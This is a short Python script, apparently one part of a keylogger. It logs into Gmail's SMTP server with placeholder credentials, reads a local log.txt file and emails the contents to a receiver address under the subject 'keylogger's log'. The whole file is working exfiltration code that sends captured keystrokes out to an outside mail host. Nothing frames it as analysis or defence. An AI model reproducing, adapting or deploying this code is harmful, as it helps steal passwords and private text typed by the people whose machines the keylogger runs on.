
#!python3
#sendLogs.p -sends log file to the mail

import smtplib
def sendMail():
    connect = smtplib.SMTP('smtp.gmail.com',587)
    connect.starttls()
    connect.login('senderEmail','senderEmailPassword')
    subject = 'keylogger\'s log'
    body = ''
    with open('log.txt','r') as file:
        for txt in file:
            body += txt

    message = 'Subject:{}\n\n{}'.format(subject,body)
    connect.sendmail('senderEmail','receiverEmail',message)
    connect.quit()

